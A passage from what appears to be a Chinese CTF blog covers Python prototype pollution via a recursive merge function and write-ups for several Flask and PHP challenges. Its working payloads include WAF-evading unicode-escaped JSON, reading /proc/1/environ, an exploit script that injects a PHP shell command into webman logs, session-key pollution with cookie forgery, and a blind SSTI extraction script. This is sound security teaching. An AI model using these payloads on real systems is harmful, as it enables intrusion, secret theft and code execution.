如果此时的dst不是字典，则进行elif语句\n\n```py\nelif hasattr(dst, k) and type(v) == dict:  \n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n```\n\nhasattr(dst, k)检查dst中是否存在k属性，并且检查v是否是字典，如果是则执行`merge(v, getattr(dst, k))`，也就是将作为src源字典传入，`getattr(dst, k)`用于 **动态获取对象 `dst` 的属性或方法**。它的作用类似于直接通过 `dst.k` 访问属性或方法，例如当k等于`__init__`的时候，则新的dst为`dst.__init__`的结果。如果不是的话则执行`setattr(dst, k, v)`，将值 `v` 赋给对象 `dst` 的属性 `k`\n\n## 污染过程\n\n通过属性和方法的一层层调用，从而实现属性的修改\n\n例如我们写个demo\n\n```python\nclass father:\n    secret = \"hello\"\nclass son_a(father):\n    pass\nclass son_b(father):\n    pass\n#父子类继承，son_a 和 son_b 类都继承自 father 类\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\ninstance = son_b()\npayload = {\n    \"__class__\" : {\n        \"__base__\" : {\n            \"secret\" : \"world\"\n        }\n    }\n}\nprint(son_a.secret)\n#hello\nprint(instance.secret)\n#hello\nmerge(payload, instance)\nprint(son_a.secret)\n#world\nprint(instance.secret)\n#world\n```\n\n**merge(payload, instance)**\n\n在这里，我们自行控制的payload作为src传入merge函数，目标实例instance作为dst传入，并且将payload对应的k和v的值取了出来\n\n我们先讲一下merge的执行步骤:\n\n- **遍历payload**\n\n第一次循环时:\n\n```\nk = \"__class__\" v = \"\"__base__\" : {\"secret\" : \"world\"}\"\n```\n\n然后会检查instance中是否有\\_\\_getitem\\_\\_方法,因为instance是实例不是字典，所以返回为false，进入elif判断，检查instance中是否有`__class__`属性和v是否为字典(因为instance是对象类型，并且含有\\_\\_class__默认属性，并且v也为字典格式，故执行这条判断语句)\n\n- **递归合并**\n\n`merge(v, getattr(dst, k))` 的作用是将一个字典 `v` 的内容合并到目标对象 `dst` 的属性 `k` 中。`getattr(dst, k)` 用于获取 `dst` 对象中的属性 `k`。如果 `k` 是一个字符串，`getattr` 将返回 `dst` 对象中名为 `k` 的属性的值。\n\n第一次递归\n\n```python\nelif hasattr(dst, k) and type(v) == dict:\nmerge(v, getattr(dst, k))\n'''\nsrc={\n        \"__base__\" : {\n            \"secret\" : \"world\"\n        }\n    }\ndst=son_b()\n'''\n```\n\n第二次递归\n\n```python\nelif hasattr(dst, k) and type(v) == dict:\nmerge(v, getattr(dst, k))\n'''\nsrc={\"secret\" : \"world\"}\ndst=father()\n'''\n```\n\n第三次递归，**type(v) == dict**为FALSE，递归结束，此时**v=“world”**,不再是字典类型，然后执行语句\n\n```\nsetattr(dst, k, v)\n```\n\n重置**father类**中的**secret**属性的值为**world**，到此简单的链污染已经完成\n\n上面的就是一个简单的python原型链污染，在这个例子中创建的对象instance对应的son_b类是存在父类的，但很多时候是没有父类的，此时就可以利用python的一些属性来寻找对应变量\n\n但是上面的是对象属性son.b()，但是并不是所有的类属性都可以被污染，而是要求我们的目标类可以被切入点类或对象可以通过属性值查找获取到\n\n## 绕过姿势\n\n- unicode绕过，但取决于是否有json.loads函数处理json数据\n\n## 攻击姿势\n\n污染`_static_folder`实现任意文件读取，将该配置指向根目录，从而可以读取根目录上开始的任意文件\n\n## 试题题目\n\n### [GeekChallenge2023]ezpython\n\n第十四届极客大挑战的题\n\n考点:python原型链污染\n\n```python\nimport json\nimport os\n\nfrom waf import waf\nimport importlib\nfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_string\n\napp = Flask(__name__)\napp.secret_key='jjjjggggggreekchallenge202333333'\nclass User():\n    def __init__(self):\n        self.username=\"\"\n        self.password=\"\"\n        self.isvip=False\n#定义了一个User类，包括三个属性，并通过init初始化方法去设置三个属性的值，其中isVip的值为false\n\nclass hhh(User):\n    def __init__(self):\n        self.username=\"\"\n        self.password=\"\"\n#定义了一个子类hhh去继承上面的父类，但是这里只有两个属性\n\nregistered_users=[]\n@app.route('/')\ndef hello_world():  # put application's code here\n    return render_template(\"welcome.html\")\n#通过一个装饰器去定义一个路由，/表示根路径，这里定义了一个hello_word函数，负责返回渲染文件并将其渲染为响应\n\n@app.route('/play')\ndef play():\n    username=session.get('username')\n    if username:\n        return render_template('index.html',name=username)\n    else:\n        return redirect(url_for('login'))\n#在session会话中把username的值赋值给username，若username存在，则使用 render_template 渲染 index.html 模板，并将 username 作为 name 变量传递给模板。这使得在模板中可以使用 {{ name }} 来显示用户名。不存在则重定向到登录界面\n\n@app.route('/login',methods=['GET','POST'])\ndef login():\n    if request.method == 'POST':\n        username=request.form.get('username')\n        password=request.form.get('password')\n        user = next((user for user in registered_users if user.username == username and user.password == password), None)\n        if user:\n            session['username'] = user.username\n            session['password']=user.password\n            return redirect(url_for('play'))\n        else:\n            return \"Invalid login\"\n        return redirect(url_for('play'))\n    return render_template(\"login.html\")\n#定义一个登录的函数，并设定请求方式为POST，从请求表单中获取username和password并查找是否存在匹配的用户，若存在则将username和password存储在session中，并重定向到/play界面\n\n@app.route('/register',methods=['GET','POST'])\ndef register():\n    if request.method == 'POST':\n        try:\n            if waf(request.data):\n                return \"fuck payload!Hacker!!!\"\n            data=json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"连用户名密码都没有你注册啥呢\"\n            user=hhh()\n            merge(data,user)\n            registered_users.append(user)\n        except Exception as e:\n            return \"泰酷辣,没有注册成功捏\"\n        return redirect(url_for('login'))\n    else:\n        return render_template(\"register.html\")\n#包含waf的注册函数，处理登录的信息，如果注册成功则会重定向到登录界面\n@app.route('/flag',methods=['GET'])\ndef flag():\n    user = next((user for user in registered_users if user.username ==session['username']  and user.password == session['password']), None)\n#使用生成器表达式和 next() 函数查找当前会话中的用户。如果找到了匹配的用户，则将其赋值给 user，否则将为 None。\n    if user:\n        if user.isvip:\n    #需要成功登录且登录用户为vip用户\n            data=request.args.get('num')\n    #从查询字符串中获取num参数\n            if data:\n                if '0' not in data and data != \"123456789\" and int(data) == 123456789 and len(data) <=10:\n                    #data不能有0，能为字符串\"123456789\"但是需要转化为整数后是123456789，且长度不超过10\n                        flag = os.environ.get('geek_flag')\n                        return render_template('flag.html',flag=flag)\n                    #获取flag的值并渲染到flag.html中\n                else:\n                    return \"你的数字不对哦!\"\n            else:\n                return \"I need a num!!!\"\n        else:\n            return render_template_string('这种神功你不充VIP也想学?<p><img src=\"{{url_for(\\'static\\',filename=\\'weixin.png\\')}}\">要不v我50,我送你一个VIP吧,嘻嘻</p>')\n    else:\n        return \"先登录去\"\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n            \nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",port=\"8888\")\n\n```\n\n这里的话看到merge的第一思路就是原型链污染，然后我们讲一下这道题的思路\n\n我们需要注册一个用户和密码，然后进行登录，登录成功后我们的用户名和密码会被存储在session中，在/flag路由中会检测session中是否含有我们的用户名和密码，并判断我们的用户是否是vip用户，所以这里我们需要污染的值就是我们的isVip值，将其值设置为true，这样可以通过验证，然后我们需要设置我们的num的值，绕过判断后就能拿到flag\n\n所以我们的payload直接用postman或者用bp发送(借一张图进行示范)\n\n![img](./../image/achieve/202411/python原型链污染/3167109-20231127220702292-213744840.png)\n\n（`__base__`是为了指向父类user的isvip从而污染）\n\n```json\n{\n    \"username\":\"1\",\n    \"password\":\"1\",\n    \"__class__\":{\n        \"__base__\":{\n            \"isvip\":true\n        }\n    }\n}\n\n```\n\n因为isvip被过滤了，所以我们要用unicode编码来绕过\\u0069\\u0073\\u0076\\u0069\\u0070\n\n```json\n{\n    \"username\":\"qetx\",\n    \"password\":\"123\",\n    \"__class__\" : {\n        \"__base__\" : {\n             \"\\u0069\\u0073\\u0076\\u0069\\u0070\":true//”isvip“:true\n        }\n    }\n}\n```\n\n这边要注意几个点，首先使用post发包，其次Content-Type: application/json，最后发送的post内容要符合json格式，可以发现注册成功，接下来先登录一下/login然后接着去访问/flag的路由，用get方法传入一个num=+123456789\n\n```\n/flag?num=+123456789\n```\n\n执行之后查看源代码就可以得到flag了\n\n![img](./../image/achieve/202411/python原型链污染/3167109-20231127220756895-1817807341.png)\n\n### DSACTF2023七月暑期赛–EzFlask\n\n```php\nimport uuid \nfrom flask import Flask, request, session \nimport json\n\nblack_list = [\"__init__\".encode(),\"__globals__\".encode()]\n\napp = Flask(__name__) \napp.secret_key = str(uuid.uuid4()) \ndef check(data): \n    for i in black_list:\n        print(i)\n        if i in data: \n            print(i)\n            return False \n    return True \n        \ndef merge(src, dst): \n    for k, v in src.items(): \n        if hasattr(dst, '__getitem__'): \n            if dst.get(k) and type(v) == dict: \n                merge(v, dst.get(k)) \n            else: dst[k] = v \n        elif hasattr(dst, k) and type(v) == dict: \n            merge(v, getattr(dst, k)) \n        else: setattr(dst, k, v) \n        \nclass user(): \n    def __init__(self): \n        self.username = \"\" \n        self.password = \"\" \n        pass \n    \n    def check(self, data): \n        if self.username == data['username'] and self.password == data['password']: \n            return True \n        return False \n#定义了一个user类并包括两个方法，一个是init初始化方法，一个是check检查函数，检查我们的username和password是否与data字典中相匹配\nUsers = [] \n@app.route('/register',methods=['POST']) \ndef register(): \n    if request.data: #检查是否包含数据\n        try: \n            print(request.data)\n            print(json.loads(request.data))\n            if not check(request.data):\n                print(\"No check\")\n                return \"Register Failed\" \n            data = json.loads(request.data)\n            print(data)\n            if \"username\" not in data or \"password\" not in data: \n                print(\"no username or passwd\")\n                return \"Register Failed\" \n            User = user() \n            merge(data, User) \n            Users.append(User) \n        except Exception as e: \n            print(\"Exception: \",e)\n            return \"Register Failed\"\n        \n        return \"Register Success\" \n    else: \n        print(\"no data\")\n        return \"Register Failed\" \n\n@app.route('/login',methods=['POST']) \ndef login(): \n    if request.data: \n        try: \n            print(request.data)\n            print(json.loads(request.data))\n            data = json.loads(request.data).encode()\n            if \"username\" not in data or \"password\" not in data: \n                return \"Login Failed\" \n            for user in Users: \n                if user.check(data): \n                    session[\"username\"] = data[\"username\"] \n                    return \"Login Success\" \n        except Exception: \n            return \"Login Failed\" \n        return \"Login Failed\" \n        \n@app.route('/',methods=['GET']) \ndef index(): \n    return open(__file__, \"r\").read() \n    #接收参数并打开当前文件并读取其内容，然后将整个文件的内容作为响应返回给客户端。\nif __name__ == \"__main__\": \n    app.run(host=\"0.0.0.0\", port=5010)\n```\n\n看到merge函数首先想到原型链污染，在index函数中是可以直接读取\\_\\_file\\_\\_对应的文件，因此想到利用merge函数去修改这个变量，将其变为我想看到的文件，可以看到register是创建了User对象，将data中的数值merge，那么就要在data中写上payload，在User类中重写了\\_\\_init\\_\\_类，同时\\_\\_file\\_\\_变量是一个全局值，就可以用上面写到的\\_\\_globals\\_\\_函数来获取全局变量并进行修改，最后再重新进入index中读取文件内容，因此最终payload为\n\n```json\ndata = {\n\t\"username\" : \"admin\", \n\t\"password\" : \"123456\", # 在data中定义username和password保证data可以进入merge函数中\n\t\"\\u005F\\u005F\\u0069\\u006E\\u0069\\u0074\\u005F\\u005F\": { # 在check中可以看到有black_list,__init__被过滤了，使用unioncode进行绕过\n\t\t\"__globals__\" : {\n\t\t\t\"__file__\": \"../../../proc/1/environ\" # 大部分的flag都隐藏在环境变量中\n\t\t}\n\t}\n}\n\n```\n\n","tags":["python原型链污染"],"categories":["python原型链污染"]},{"title":"ctfshow单身杯2","url":"/2025/04/30/ctfshow单身杯2/","content":"\n# 0x01前言\n\n也是做上ctfshow双十一的单身杯了，但是比赛的时候发现难的抠脚，很多题压根做不出来，所以只能赛后复现了，wp也是融合了自己的想法和借鉴了官方wp，只能说是当做一次学习了\n\n# 0x02赛题\n\n# 签到·好玩的PHP\n\n```php\n<?php\n    error_reporting(0);\n    highlight_file(__FILE__);\n    class ctfshow {\n        private $d = '';\n        private $s = '';\n        private $b = '';\n        private $ctf = '';\n        public function __destruct() {\n            $this->d = (string)$this->d;\n            $this->s = (string)$this->s;\n            $this->b = (string)$this->b;\n            if (($this->d != $this->s) && ($this->d != $this->b) && ($this->s != $this->b)) {\n                $dsb = $this->d.$this->s.$this->b;\n\n                if ((strlen($dsb) <= 3) && (strlen($this->ctf) <= 3)) {\n                    if (($dsb !== $this->ctf) && ($this->ctf !== $dsb)) {\n                        if (md5($dsb) === md5($this->ctf)) {\n                            echo file_get_contents(\"/flag.txt\");\n                        }\n                    }\n                }\n            }\n        }\n    }\n    unserialize($_GET[\"dsbctf\"]);\n```\n\n审代码:\n\n- 析构函数destruct()魔术方法会在对象调用结束或者对象销毁的时被调用，在魔术方法中，三个属性的值都被转换成字符串的类型\n- 赋值判断:判断三个参数之间是否两两不相等，如果满足将三个参数拼接赋值给dsb参数\n- 第一层判断:判断dsb和ctf两个参数的字符串长度是否都小于等于3\n- 第二层判断:通过强比较判断两个参数的值和类型是否都不相等\n- 第三层判断:通过强比较判断这两个参数的md5值是否强相等\n\n当php中我们计算数字123的md5值的时候，会自动将数字123转化成字符串'123'，然后再进行哈希值比较，所以我们只要传入两个不同类型的字符数字，基本上哈希值都是一样的\n\n```php\n<?php\n$d = '1';\n$s = '2';\n$b = '3';\n$ctf = 123;\n$dsb = $d.$s.$b;\nif(md5($dsb) == md5($ctf)){\n    echo 'yes';\n}\n//yes\n```\n\n所以我们的exp\n\n```php\n<?php\n    class ctfshow {\n        private $d = '1';\n        private $s = '2';\n        private $b = '3';\n        private $ctf = 123;\n    }\n\n    $dsbctf = new ctfshow();\n\n    echo urlencode(serialize($dsbctf));\n```\n\n将编码出来的字符串传入dsbctf然后就可以出flag了\n\n讲一下官方的做法\n\n### 特殊浮点数常量\n\n特殊浮点数常量通常指的是在编程语言中定义的一些具有特定含义的浮点数值，这些值通常用于表示非标准的数值\n\n1. **正无穷大（Positive Infinity）**\n\n表示一个比所有有限浮点数都大的数。在许多编程语言中，这通常是通过某种特定的操作得出的，比如将一个正数除以零。它通常表示为 `Infinity` 或 `inf`。\n\n2. **负无穷大（Negative Infinity）**\n\n表示一个比所有有限浮点数都小的数，通常表示为 `-Infinity` 或 `-inf`。\n\n3. **NaN（Not a Number）**\n\n表示一个未定义或不可表示的数值，例如 0 除以 0，或者对负数取平方根。这种情况通常表示计算错误或无效操作。NaN 的比较行为也很特殊：任何与 NaN 进行比较的结果（包括与自身比较）都是 false。\n\n4. **正零（+0）和负零（-0）**\n\n在 IEEE 754 标准中，正零和负零是两个不同的值。它们在许多情况下表现相似，但在某些情况下（如某些数学运算），它们的行为可能不同。例如，在计算中，`1.0 / 0.0` 会返回正无穷大，而 `1.0 / -0.0` 会返回负无穷大。\n\n基于上述的条件，可以用PHP中的特殊浮点数常量`NAN`和`INF`来构造payload，因为将这两个常量转成字符串类型之后的md5值与原先的浮点类型md5值相等，又由于类型不相等、长度均为3，所以可以满足最后三个if判断。由于在第一个判断条件中要求变量`$dsb`的三个字符互不相等，因此只能取`INF`来构造payload：\n\n```PHP\n<?php\n    class ctfshow {\n        private $d = 'I';\n        private $s = 'N';\n        private $b = 'F';\n        private $ctf = INF;\n    }\n\n    $dsbctf = new ctfshow();\n\n    echo urlencode(serialize($dsbctf));\n```\n\n```PHP\nO%3A7%3A%22ctfshow%22%3A4%3A%7Bs%3A10%3A%22%00ctfshow%00d%22%3Bs%3A1%3A%22I%22%3Bs%3A10%3A%22%00ctfshow%00s%22%3Bs%3A1%3A%22N%22%3Bs%3A10%3A%22%00ctfshow%00b%22%3Bs%3A1%3A%22F%22%3Bs%3A12%3A%22%00ctfshow%00ctf%22%3Bd%3AINF%3B%7D\n```\n\n切入点:\n\n#### **特殊浮点数常量转化为字符串前后的md5值相等**\n\n# 迷雾重重\n\n### #框架日志文件注入\n\n![image-20241113134031710](./../image/achieve/202411/DSBCTF单身杯/image-20241113134031710.png)\n\n这道题我并没做出来，但根据官方的wp写了一些自己的想法\n\n首先打开题目，框架是用的workerman的webman框架\n\n我们先放到seay里分析一下吧\n\n![image-20250430111140408](../image/achieve/202411/DSBCTF单身杯/image-20250430111140408.png)\n\n根据官方wp，需要先查看控制器的代码\n\n### IndexController.php\n\n```PHP\n<?php\n\nnamespace app\\controller;\n\nuse support\\Request;\nuse support\\exception\\BusinessException;\n\nclass IndexController\n{\n    public function index(Request $request)\n    {\n        \n        return view('index/index');\n    }\n\n    public function testUnserialize(Request $request){\n        if(null !== $request->get('data')){\n            $data = $request->get('data');\n            unserialize($data);\n        }\n        return \"unserialize测试完毕\";\n    }\n\n    public function testJson(Request $request){\n        if(null !== $request->get('data')){\n            $data = json_decode($request->get('data'),true);\n            if(null!== $data && $data['name'] == 'guest'){\n                return view('index/view', $data);\n            }\n        }\n        return \"json_decode测试完毕\";\n    }\n\n    public function testSession(Request $request){\n        $session = $request->session();\n        $session->set('username',\"guest\");\n        $data = $session->get('username');\n        return \"session测试完毕 username: \".$data;\n\n    }\n\n    public function testException(Request $request){\n        if(null != $request->get('data')){\n            $data = $request->get('data');\n            throw new BusinessException(\"业务异常 \".$data,3000);\n        }\n        return \"exception测试完毕\";\n    }\n\n\n}\n```\n\n不会代码的话建议先代码审计一下，这也是学习的过程\n\n这里的话设置了IndexController的四个方法：\n\n- index 方法\n\n就是正常的渲染视图\n\n- testUnserialize方法\n\n反序列化操作，对data的值进行反序列化\n\n- testJson方法\n\nJSON 数据解密操作，对传入data的JSON字符串解析为数组，如果data中的name字段的值为guest，则进行渲染\n\n- testSession方法\n\nsession会话设置操作，获取当前session会话对象，并设置会话的username为guest，获取会话变量 `username` 的值并返回。\n\n- **testException**方法\n\n异常抛出操作，如果有data的传入则抛出异常，并传递异常信息和错误码 `3000`。\n\n本来以为是打的反序列化的，但是搜索了一下`__destruct()方法`也没找到可以利用的地方，然后session的话不知道能不能打文件包含，那么就剩下一个了，也就是testJson\n\n```php\npublic function testJson(Request $request){\n    if(null !== $request->get('data')){\n        $data = json_decode($request->get('data'),true);\n        if(null!== $data && $data['name'] == 'guest'){\n            return view('index/view', $data);\n        }\n    }\n    return \"json_decode测试完毕\";\n}\n```\n\n这里有个view，并且参数2是可控的，我们跟进一下\n\n```php\n//view\nfunction view(string $template, array $vars = [], string $app = null, string $plugin = null): Response\n{\n    $request = \\request();\n    $plugin = $plugin === null ? ($request->plugin ?? '') : $plugin;\n    $handler = \\config($plugin ? \"plugin.$plugin.view.handler\" : 'view.handler');\n    return new Response(200, [], $handler::render($template, $vars, $app, $plugin));\n}\n```\n\n这里的话调用了$handler的render方法，我们跟进这个handler的内容\n\n```php\n//index/view\nreturn [\n    'handler' => Raw::class\n];\n```\n\nhandler指向Raw类，跟进这个文件\n\n![image-20250430122415219](../image/achieve/202411/DSBCTF单身杯/image-20250430122415219.png)\n\n这里能进行变量覆盖，并且还有include函数，可以尝试打一下文件包含\n\n```php\nextract($vars);\ninclude $__template_path__;\n```\n\n我们看看var变量\n\n![image-20250430122635175](../image/achieve/202411/DSBCTF单身杯/image-20250430122635175.png)\n\n发现var变量就是我们可控的data参数，那就可以打变量覆盖了，只需要覆盖掉`$__template_path__`就能打**文件包含漏洞**\n\n那我们看看怎么打文件包含呢？\n\n- 正常的文件包含的话，只有file协议可以用，其他的都用不了\n\n- nginx apache 不存在，排除日志包含的思路\n- session文件包含的话，目录路径不可知，也打不了\n\n因为有种种限制，最后就推向了一个方法，框架日志文件包含，默认的框架日志文件\n\n![image-20250430125128805](../image/achieve/202411/DSBCTF单身杯/image-20250430125128805.png)\n\n默认的日志文件路径是/logs/webman.log\n\n然后自己在本地测试一下就可以知道日志文件的格式runtime/logs/webman-{}-{}-{}.log\n\n![image-20250430134152858](../image/achieve/202411/DSBCTF单身杯/image-20250430134152858.png)\n\n![image-20250430134210763](../image/achieve/202411/DSBCTF单身杯/image-20250430134210763.png)\n\n所以我们这道题的思路就是包含这个webman的日志文件，通过包含php代码会导致include失败这个特性，include失败后自然就会将报错信息写入日志文件，那么这个php代码也会被写入日志文件，但是此时我们需要先知道网站的根目录，知道根目录后我们才能去打文件包含\n\n在基于 Linux 的操作系统中，`/proc` 目录下存储了关于系统和运行中进程的信息。每个运行中的进程都会在 `/proc/[pid]/cmdline` 文件中保存该进程的启动命令行信息，其中可能包含启动该进程时使用的脚本或可执行文件路径。如果目标 Web 应用的主进程是由一个 PHP 文件（比如 `start.php`）启动的，`cmdline` 文件中就可能包含该 PHP 文件的路径信息。\n\n官方脚本\n\n```python\nimport requests\nimport time\nfrom datetime import datetime\n\n# 注意 这里题目地址 应该https换成http\nurl=\"http://f5f954bb-e654-44b7-be30-619047e0bac7.challenge.ctf.show/\"\n\n# Author: ctfshow h1xa\ndef get_webroot():\n    print(\"[+] Getting webroot...\")\n\n    webroot = \"\"\n\n    for i in range(1, 300):\n        r = requests.get(\n            url=url + 'index/testJson?data={{\"name\": \"guest\", \"__template_path__\": \"/proc/{}/cmdline\"}}'.format(i))\n        time.sleep(0.2)\n        if \"start.php\" in r.text:\n            print(f\"[\\033[31m*\\033[0m] Found start.php at /proc/{i}/cmdline\")\n            webroot = r.text.split(\"start_file=\")[1][:-10]\n            # print(r.text)\n            print(f\"Found webroot: {webroot}\")\n            break\n    return webroot\n\n\ndef send_shell(webroot):\n    # payload = 'index/testJson?data={{\"name\":\"guest\",\"__template_path__\":\"<?php%20`ls%20/>{}/public/ls.txt`;?>\"}}'.format(webroot)\n    payload = 'index/testJson?data={{\"name\":\"guest\",\"__template_path__\":\"<?php%20`cat%20/s00*>{}/public/flag.txt`;?>\"}}'.format(\n    webroot)\n    r = requests.get(url=url + payload)\n    time.sleep(1)\n    if r.status_code == 500:\n        print(\"[\\033[31m*\\033[0m] Shell sent successfully\")\n    else:\n        print(\"Failed to send shell\")\n\n\ndef include_shell(webroot):\n    now = datetime.now()\n    payload = 'index/testJson?data={{\"name\":\"guest\",\"__template_path__\":\"{}/runtime/logs/webman-{}-{}-{}.log\"}}'.format(\n        webroot, now.strftime(\"%Y\"), now.strftime(\"%m\"), now.strftime(\"%d\"))\n    r = requests.get(url=url + payload)\n    time.sleep(5)\n    r = requests.get(url=url + 'flag.txt')\n    if \"ctfshow\" in r.text:\n        print(\"=================FLAG==================\\n\")\n        print(\"\\033[32m\" + r.text + \"\\033[0m\")\n        print(\"=================FLAG==================\\n\")\n        print(\"[\\033[31m*\\033[0m] Shell included successfully\")\n    else:\n        print(\"Failed to include shell\")\n\n\ndef exploit():\n    webroot = get_webroot()\n    send_shell(webroot)\n    include_shell(webroot)\n\n\nif __name__ == '__main__':\n    exploit()\n\n\n```\n\n其实这道题的重点还是需要找出日志文件的路径位置\n\n# ez_inject\n\n### #预期\n\nsession伪造`&&`flask原型链污染`&&`flask的ssti盲注\n\n![image-20241202192548888](./../image/achieve/202411/DSBCTF单身杯/image-20241202192548888.png)\n\n扫目录的结果\n\n```\n[13:51:07] Scanning:\n[13:51:26] 200 -    1KB - /chat\n[13:51:30] 405 -   153B - /echo\n[13:51:36] 200 -    1KB - /login\n[13:51:36] 302 -   189B - /logout  ->  /\n[13:51:42] 200 -    1KB - /register\n[13:51:43] 403 -    1KB - /secret\n```\n\n访问/chat提示让我们去污染一下\n\n![image-20250430135923506](../image/achieve/202411/DSBCTF单身杯/image-20250430135923506.png)\n\n这样子一看肯定就是注册页面有污染了，但是在哪里呢？、\n\n访问/secret页面\n\n![image-20250430142432034](../image/achieve/202411/DSBCTF单身杯/image-20250430142432034.png)\n\n翻了一圈除了一个cookie和源码中提示\n\n```\nuser=eyJlY2hvX21lc3NhZ2UiOiIxIiwiaXNfYWRtaW4iOjAsInVzZXJuYW1lIjoid2FudGgzZjFhZyJ9.aBHQyQ.bR_4K3Q-iJhwEGK3AmaTUjubArc\n```\n\n![image-20250430140024049](../image/achieve/202411/DSBCTF单身杯/image-20250430140024049.png)\n\n这个cookie格式很像JWT，但是也可能是session，解密一下看看\n\n![image-20250430152807364](../image/achieve/202411/DSBCTF单身杯/image-20250430152807364.png)\n\n不符合JWT的内容，那我们用flask-unsign解密一下\n\n```\nflask-unsign --decode --cookie 'eyJlY2hvX21lc3NhZ2UiOiIxIiwiaXNfYWRtaW4iOjAsInVzZXJuYW1lIjoid2FudGgzZjFhZyJ9.aBHQyQ.bR_4K3Q-iJhwEGK3AmaTUjubArc'\n```\n\n![image-20250430152831924](../image/achieve/202411/DSBCTF单身杯/image-20250430152831924.png)\n\n这里可以看到有is_admin为0，根据之前的secret界面，我们是需要把is_admin设置为1的，那就说明我们需要拿到secret_key\n\n这里不知道是不是flask，但是flask框架的secret_key是可以被污染的，尝试写个预想的demo\n\n```python\nfrom flask import *\nimport os\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'test'\n\nclass test:\n    def __init__(self):\n        pass\n\n\ndef merge(src, dst):  #src为源字典，dst为目标字典\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):  #键值对字典形式\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))  #递归到字典最后一层\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:  #class形式\n            merge(v, getattr(dst, k))  #递归到最终的父类\n        else:\n            setattr(dst, k, v)\ntest = test()\nprint(app.config['SECRET_KEY'])\npayload = {\n    \"__init__\":{\n        \"__globals__\":{\n            \"app\":{\n                \"config\":{\n                    \"SECRET_KEY\":\"success\"\n                }\n            }\n        }\n    }\n}\nmerge(payload,test)\nprint(app.config['SECRET_KEY'])\n```\n\n污染成功，那我们试着写一下payload污染一下原有的key\n\n```python\nimport requests\nimport json\n\nurl = \"http://4954de32-8e1f-4094-ae60-ce68918259e7.challenge.ctf.show/register\"\n\npayload = {\n    \"username\" : \"vu1n4bly\",\n    \"password\" : \"vu1n4bly\",\n    \"__init__\" : {\n        \"__globals__\" : {\n            \"app\" : {\n                \"config\" : {\n                    \"SECRET_KEY\":\"vu1n4bly\"\n                }\n            }\n        }\n    }\n}\nr = requests.post(url, json=payload)\nprint(r.text)\n```\n\n![image-20250430153220337](../image/achieve/202411/DSBCTF单身杯/image-20250430153220337.png)\n\n污染成功了，那我们可以进行session伪造了\n\n```\nflask-unsign --sign --cookie \"{ 'is_admin': 1, 'username': 'vu1n4bly'}\" --secret 'vu1n4bly'\n```\n\n登陆后伪造一下session，访问/secret\n\n![image-20250430153919612](../image/achieve/202411/DSBCTF单身杯/image-20250430153919612.png)\n\n应该是ssti了，测试一下\n\n传入config有回显，并且是不带括号的ssti\n\n![image-20250430154619543](../image/achieve/202411/DSBCTF单身杯/image-20250430154619543.png)\n\n传入cycler返回\n\n```\nYour message: your answer is &lt;class &#39;jinja2.utils.Cycler&#39;&gt;\n```\n\n传入\n\n```\ncycler[\"__in\"+\"it__\"]\n\ncycler[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"]\n\ncycler[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"][\"__bui\"+\"ltins__\"]\n\ncycler[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"][\"__bui\"+\"ltins__\"].__import__('builtins')\n\ncycler[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"][\"__bui\"+\"ltins__\"].open('/flag').read(1)[0]=='c'\n```\n\n第一个发现有回显，那我们慢慢试吧\n\n![image-20250430155449815](../image/achieve/202411/DSBCTF单身杯/image-20250430155449815.png)\n\n```\ncycler[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"]  [\"__bui\"+\"ltins__\"].__import__('builtins').open('/flag').read(1)[0] =='c'\n```\n\n传入的时候返回True，那就打盲注，直接写脚本\n\n```python\nimport requests\n\nurl = \"http://4954de32-8e1f-4094-ae60-ce68918259e7.challenge.ctf.show/echo\"\n\ndicts = \"qwertyuiopasdfghjklzxcvbnm{}-12334567890\"\n\nheaders = {\n    \"Content-Type\" : \"application/x-www-form-urlencoded\",\n    \"Cookie\" : \"user=eyJlY2hvX21lc3NhZ2UiOiJ5b3VyIGFuc3dlciBpcyBUcnVlIiwiaXNfYWRtaW4iOjEsInVzZXJuYW1lIjoidnUxbjRibHkifQ.aBHXdA.mh5p2gCL57hAgruXZdKdSkeGQ3w\"\n}\nflag = \"\"\n\n\nfor i in range(50):\n    for dict in dicts :\n        payload = '''\n        cycler[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"][\"__bui\"+\"ltins__\"].__import__('builtins').open('/flag').read({})[{}]=='{}'\n        '''.format(i+1,i,dict)\n        print(payload)\n        data = {\n            \"message\":payload,\n        }\n        r = requests.post(url, data=data,headers=headers)\n        if 'Your message: your answer is True' in r.text:\n            flag += dict\n            print(flag)\n            if dict == \"}\":\n                exit()\n            break\n```\n\n### #非预期\n\n默认情况下，Flask 会将静态文件存储在名为 `static` 的目录中。所以如果没有显式设置 `_static_folder`，Flask 会默认使用项目根目录下的 `static` 文件夹作为静态文件目录。那如果我们设置`_static_folder`为根目录，那么那么 Flask 会将整个根目录（即服务器的文件系统根目录）作为静态文件目录。\n\n非预期很简单，可以直接污染静态文件目录为根目录就可以拿到flag\n\n```python\nimport requests\nimport json\n\nurl = \"http://4954de32-8e1f-4094-ae60-ce68918259e7.challenge.ctf.show/register\"\n\npayload = {\n    \"username\" : \"vu1n4bly\",\n    \"password\" : \"vu1n4bly\",\n    \"__init__\" : {\n        \"__globals__\" : {\n            \"app\" : {\n                \"_static_folder\":\"/\"\n            }\n        }\n    }\n}\nr = requests.post(url, 